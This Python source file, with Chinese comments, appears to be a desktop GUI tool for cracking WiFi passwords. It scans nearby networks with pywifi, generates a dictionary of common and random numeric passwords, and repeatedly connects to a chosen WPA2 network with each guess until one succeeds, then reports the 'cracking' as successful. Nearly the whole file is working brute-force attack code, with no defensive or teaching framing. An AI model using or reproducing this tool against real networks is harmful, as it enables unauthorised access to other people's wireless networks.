import tkinter  as tk
import tkinter.messagebox
from tkinter import ttk
from tkinter import filedialog
import random
import os
import time
import pywifi     #pip install pywifi
from pywifi import const      #pip install comtypes

class Tl_wifi_scan_screen(object):
    def __init__(self):
        self.master = tk.Tk()
        # self.master = tk.Tk()
        self.master.title('wifi 地址扫描')

        # 创建的Toplevel对象 在最上层
        # self.master.attributes("-toolwindow", 1)
        # self.master.wm_attributes("-topmost", 1)
        self.setCenter(self.master, 620, 500)
        self.SetupUI()
        self.master.mainloop()

    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    def setCenter(self,root, w, h):
        ws = root.winfo_screenwidth()
        hs = root.winfo_screenheight()
        x = int((ws / 2) - (w / 2))
        y = int((hs / 2) - (h / 2))
        root.geometry('{}x{}+{}+{}'.format(w, h, x, y))

    def SetupUI(self):
        # 存储要破解的wifi信号
        self.get_wifi_value = tk.StringVar()
        # 存储要破解wifi信号对应的密码
        self.get_wifimm_value = tk.StringVar()
        self.wifi = pywifi.PyWiFi()  # 抓取网卡接口
        self.iface = self.wifi.interfaces()[0]  # 抓取第一个无线网卡
        print(self.iface.name())
        # self.iface.disconnect()  # 测试链接断开所有链接
        # time.sleep(1)  # 休眠1秒
        # # 测试网卡是否属于断开状态
        # assert self.iface.status() in \
        #        [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        fm1=tk.LabelFrame(self.master,text='密码文本生成',padx=5,pady=5,height=400)
        fm1.grid(row=0,column=0,padx=5,pady=5)

        tk.Label(fm1,text='密码内容').pack(anchor='w')
        # # 设定默认值
        self.pwd_str = tk.StringVar()
        self.pwd_str.set('0,1,2,3,4,5,6,7,8,9')
        tk.Entry(fm1, textvariable=self.pwd_str, font=('Arial', 10),width=20).pack(anchor='nw')

        fm1_1 = tk.Frame(fm1, padx=1, pady=1)
        fm1_1.pack(anchor='w',fill=tk.X)
        tk.Label(fm1_1,text='密码长度').pack(anchor='nw')
        # # 设定默认值
        self.pwd_len = tk.IntVar()
        self.pwd_len.set(8)
        tk.Entry(fm1_1, textvariable=self.pwd_len, font=('Arial', 10), width=3).place(y=1,x=54)

        f = tk.Frame(fm1)
        f.pack(anchor='nw')
        tk.Label(f, text='常用密码(优先破译)').pack(anchor='nw')
        s1 = tk.Scrollbar(f, orient=tk.VERTICAL)
        self.b1 = tk.Text(f, bg='green',width=20,height=16,yscrollcommand=s1.set,wrap=tk.NONE)
        s1.pack(side=tk.RIGHT,fill=tk.Y)
        s1.config(command=self.b1.yview)
        self.b1.pack(anchor='nw')

        #给text写入初始值
        self.b1.insert(tk.INSERT,"12345678\n")
        self.b1.insert(tk.END, "123456789\n")
        self.b1.insert(tk.END, "88888888\n")
        self.b1.insert(tk.END, "1234567890\n")
        self.b1.insert(tk.END, "00000000\n")
        self.b1.insert(tk.END, "87654321\n")
        self.b1.insert(tk.END, "66668888\n")
        self.b1.insert(tk.END, "11223344\n")
        self.b1.insert(tk.END, "147258369\n")
        self.b1.insert(tk.END, "111111111\n")

        fm1_2 = tk.Frame(fm1, padx=1, pady=1)
        fm1_2.pack(anchor='w',fill=tk.X)
        tk.Label(fm1_2,text='密码文件位置:').pack(anchor='nw')
        tk.Button(fm1_2, text='...', width=3, command=self.selectPath).place(y=1, x=74)
        # # 设定默认值
        self.pwd_file = tk.StringVar()
        self.pwd_file.set("e://wifi_pwd.txt")
        tk.Entry(fm1_2, textvariable=self.pwd_file, font=('Arial', 9), width=22).pack(anchor='nw')

        tk.Button(fm1, text='生成密码文本',command=self.get_pwd_txt).pack(anchor='nw')

        #右半边的界面编写
        fm2 = tk.LabelFrame(self.master,width=200, text="配置",height=400)
        fm2.grid(column=1, row=0, padx=10, pady=10,ipadx=10)

        fm2_0 = tk.Frame(fm2,width=200, height=40)
        fm2_0.pack(anchor='nw',side='top')
        self.search = tk.Button(fm2_0, text="搜索附近WiFi", command=self.scans_wifi_list).place(y=1, x=4)
        self.pojie = tk.Button(fm2_0, text="开始破解", command=self.readPassWord).place(y=1, x=104)
        # self.pojie = tk.Button(labelframe, text="开始破解", command=self.readPassWord).grid(column=1, row=0)

        fm2_1 = tk.Frame(fm2,width=200, height=50)
        fm2_1.pack(anchor='nw',side='top')
        tk.Label(fm2_1,text='密码文件位置:').place(y=1, x=2)
        tk.Button(fm2_1, text='...', width=3, command=self.selectPath2,height=1).place(y=1, x=84)
        # # 设定默认值
        self.wifi_pwd_file = tk.StringVar()
        self.wifi_pwd_file.set("e://wifi_pwd.txt")
        tk.Entry(fm2_1, textvariable=self.wifi_pwd_file, font=('Arial', 9), width=32).place(y=25, x=3)

        fm2_2 = tk.Frame(fm2, width=300, height=40)
        fm2_2.pack(anchor='nw',side='top')
        self.wifi_text = tk.Label(fm2_2, text="WiFi账号：").place(x=2,y=10)
        self.wifi_input = tk.Entry(fm2_2, width=16, textvariable=self.get_wifi_value).place(x=70,y=10)
        self.wifi_mm_text = tk.Label(fm2_2, text="WiFi密码：").place(x=170,y=10)
        self.wifi_mm_input = tk.Entry(fm2_2, width=12, textvariable=self.get_wifimm_value).place(x=230,y=10)

        self.wifi_labelframe = tk.LabelFrame(fm2,text="wifi列表")
        self.wifi_labelframe.pack(anchor='nw')

        # # 定义树形结构与滚动条
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=tk.VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # # 表格的宽度\对齐方式\标题
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=120, anchor="center")
        self.wifi_tree.column("d", width=80, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=0, column=0, sticky=tk.NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=0, column=1, sticky=tk.NS)

    #左手边密码文件的文件位置选择框
    def selectPath(self):
         path_ = filedialog.askdirectory()
         file = 'wifi_pwd.txt'
         path_=os.path.join(path_,file)
         self.pwd_file.set(path_)

    # 右手边密码文件的文件位置选择框
    def selectPath2(self):
        path_ = filedialog.askdirectory()
        file = 'wifi_pwd.txt'
        path_ = os.path.join(path_, file)
        self.wifi_pwd_file.set(path_)

    #生成密码文件
    def get_pwd_txt(self):
        pwd_dict=[]  #密码列表
        #把'常用密码(优先破译)'先写入pwd_dict 密码列表中
        comm_pwd = self.b1.get(0.0,tk.END).split('\n')
        print(comm_pwd)
        for i in comm_pwd:
            if i=='':
                pass
            else:
                pwd_dict.append(i)
        print(pwd_dict)
        #from_str中存储 密码  字母的内容
        from_str=[]
        pwd_str=self.pwd_str.get().split(',')
        for i in pwd_str:
            from_str.append(i)
        # 取得可以为 密码字母的总个数,减去1是为了用Range
        from_str_len = len(from_str) - 1
        #密码长度
        pwd_length = self.pwd_len.get()
        #先生成100个密码字符，放入 密码列表 中
        for num in range(100):
            str = ""
            for i in range(pwd_length):
                str = str + from_str[random.randrange(0, from_str_len)]
            print(str)
            if str in pwd_dict:
                pass
            else:
                pwd_dict.append(str)
        # print(pwd_dict)
        try:
            # print(self.pwd_file.get())
            fo = open(self.pwd_file.get(), "w")
        except IOError:
            print("Open File "+ self.pwd_file.get() +" Failed!!!")
        for i in pwd_dict:
            fo.write(i+'\n')
        fo.close()

    # 搜索wifi
    def scans_wifi_list(self):  # 扫描周围wifi列表
        self.iface.disconnect()  # 测试链接断开所有链接
        time.sleep(5)  # 休眠5秒

        # 开始扫描
        print("^_^ 开始扫描附近wifi...")
        self.iface.scan()
        time.sleep(15)
        # 在若干秒后获取扫描结果
        scanres = self.iface.scan_results()
        # 统计附近被发现的热点数量
        nums = len(scanres)
        print("数量: %s" % (nums))
        # 实际数据
        self.show_scans_wifi_list(scanres)
        return scanres

    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))
            # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    # Treeview绑定事件
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    # 读取密码字典，进行匹配
    def readPassWord(self):
        #密码字典的文件
        self.getFilePath = self.wifi_pwd_file.get()
        # print("文件路径：%s\n" %(self.getFilePath))
        self.get_wifissid = self.get_wifi_value.get()
        # print("ssid：%s\n" %(self.get_wifissid))
        self.pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = self.pwdfilehander.readline()
                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)
                # print("返回值：%s\n" %(self.bool1) )
                if self.bool1:
                    # print("密码正确："+pwdStr
                    # res = "密码:%s 正确 \n"%self.pwdStr;
                    self.res = "===正确===  wifi名:%s  匹配密码：%s " % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo('提示', '破解成功！！！')
                    print(self.res)
                    break
                else:
                    # print("密码:"+self.pwdStr+"错误")
                    self.res = "---错误--- wifi名:%s匹配密码：%s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                sleep(3)
            except:
                continue

    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        # 创建wifi链接文件
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifi名称
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元
        self.profile.key = pwd_Str  # 密码
        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
        self.iface.connect(self.tmp_profile)  # 链接
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # 断开
        time.sleep(1)
        # 检查断开状态
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK

if __name__=='__main__':
    Tl_wifi_scan_screen()